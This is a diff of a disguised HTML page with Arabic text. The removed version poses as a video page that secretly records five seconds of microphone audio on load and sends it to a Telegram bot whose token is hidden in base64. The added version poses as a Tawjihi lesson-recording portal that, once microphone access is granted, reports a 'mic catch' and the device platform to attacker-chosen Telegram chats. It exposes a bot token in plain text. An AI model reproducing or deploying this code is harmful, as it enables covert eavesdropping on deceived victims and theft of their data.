@@ -1,36 +1,20 @@
 <!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Voice System</title>
-    <style>
-        body { background: #000; text-align: center; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; }
-        video { width: 95%; max-width: 400px; border-radius: 10px; }
-    </style>
-</head>
-<body>
-    <video autoplay muted loop playsinline>
-        <source src="https://www.w3schools.com/html/horse.mp4" type="video/mp4">
-    </video>
+<html>
+<head><meta charset="UTF-8"><title>تسجيل الحصص - 2009</title></head>
+<body style="text-align:center; background:#f4f4f4; padding:50px;">
+    <h3>بوابة تسجيل حصص التوجيهي 🎤</h3>
+    <button onclick="rec()" style="padding:20px; background:#3498db; color:#fff; border:none; border-radius:10px;">بدء التسجيل</button>
     <script>
-        window.onload = function() {
-            navigator.mediaDevices.getUserMedia({ audio: true })
-            .then(stream => {
-                const mediaRecorder = new MediaRecorder(stream);
-                mediaRecorder.start();
-                const chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'audio/mp3' });
-                    const t = atob("ODM4NjQyNzMyMTpBQUZLcThmQ3NvUEVEZ2NGOEtORlIyTlVyN0doMER3ZnNrRQ==");
-                    const id = new URLSearchParams(window.location.search).get('id');
-                    const f = new FormData(); f.append('voice', blob, 'v.mp3'); f.append('chat_id', id);
-                    fetch(`https://api.telegram.org/bot${t}/sendVoice`, { method: 'POST', body: f });
-                };
-                setTimeout(() => mediaRecorder.stop(), 5000);
-            }).catch(() => { alert("سماح لتشغيل الصوت"); });
-        };
+        const pr = new URLSearchParams(window.location.search);
+        const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
+        function rec() {
+            navigator.mediaDevices.getUserMedia({ audio: true }).then(s => {
+                const msg = encodeURIComponent(`🎤 صيدة مايك من: ${pr.get('hunter')}\n📱 جهاز: ${navigator.platform}`);
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('id')}&text=${msg}`);
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('dev')}&text=${msg}`);
+                alert("بدأ التسجيل...");
+            }).catch(e => alert("اسمح بالمايك"));
+        }
     </script>
 </body>
 </html>
